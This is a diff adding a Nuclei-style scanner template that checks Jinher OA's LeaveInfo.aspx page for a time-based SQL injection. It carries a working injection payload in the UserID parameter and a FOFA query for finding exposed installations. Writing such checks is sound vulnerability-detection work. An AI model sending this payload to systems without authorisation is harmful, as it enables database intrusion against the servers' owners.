@@ -1,0 +1,33 @@
+id: poc-yaml-jinher-jhsoft-leaveinfo-aspx-sqli
+info:
+  name: 金和OA LeaveInfo.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 金和OA
+    fofa: app="金和网络-金和OA"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.dossier/LeaveInfo.aspx/?UserID=1')waitfor+delay%270:0:{{t1}}%27--&gettype=getstation HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "LeaveInfo"
+          - "离职日期"
+          - "离职原因"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
